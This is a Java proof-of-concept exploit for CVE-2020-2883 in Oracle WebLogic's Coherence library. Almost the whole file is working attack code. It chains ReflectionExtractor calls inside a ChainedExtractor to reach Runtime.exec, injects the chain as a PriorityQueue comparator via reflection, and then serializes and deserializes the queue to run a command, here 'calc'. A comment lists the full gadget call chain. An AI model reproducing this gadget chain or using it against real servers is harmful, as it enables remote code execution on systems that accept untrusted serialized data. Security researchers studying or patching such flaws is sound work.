package com.r17a.weblogic.cve;

import com.tangosol.coherence.reporter.extractor.ConstantExtractor;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

/**
 * java.util.PriorityQueue.readObject()
 * java.util.PriorityQueue.heapify()
 * java.util.PriorityQueue.siftDown()
 * java.util.PriorityQueue.siftDownUsingComparator()
 * com.tangosol.util.extractor.AbstractExtractor.compare()
 * com.tangosol.util.extractor.MultiExtractor.extract()
 * com.tangosol.util.extractor.ChainedExtractor.extract()
 * //...
 * Method.invoke()
 * //...
 * Runtime.exec()
 */

public class CVE_2020_2883_POC1 {

    public static void main(String[] args) throws Exception {
        String command = "calc";
        ValueExtractor[] valueExtractors = new ValueExtractor[]{
                new ConstantExtractor(Runtime.class),
                new ReflectionExtractor("getMethod", new Object[]{"getRuntime", new Class[0]}),
                new ReflectionExtractor("invoke", new Object[]{null, new Object[0]}),
                new ReflectionExtractor("exec", new Object[]{command})
        };

        ChainedExtractor chainedExtractor = new ChainedExtractor(valueExtractors);

        ExtractorComparator extractorComparator = new ExtractorComparator<Object>();
        Field m_extractor = extractorComparator.getClass().getDeclaredField("m_extractor");
        m_extractor.setAccessible(true);
        m_extractor.set(extractorComparator, chainedExtractor);

        PriorityQueue priorityQueue = new PriorityQueue();
        priorityQueue.add("foo");
        priorityQueue.add("bar");

        Field comparator = priorityQueue.getClass().getDeclaredField("comparator");
        comparator.setAccessible(true);
        comparator.set(priorityQueue, extractorComparator);

        // 序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(priorityQueue);
        oos.flush();
        oos.close();
        // 反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        Object obj = (Object) ois.readObject();
    }
}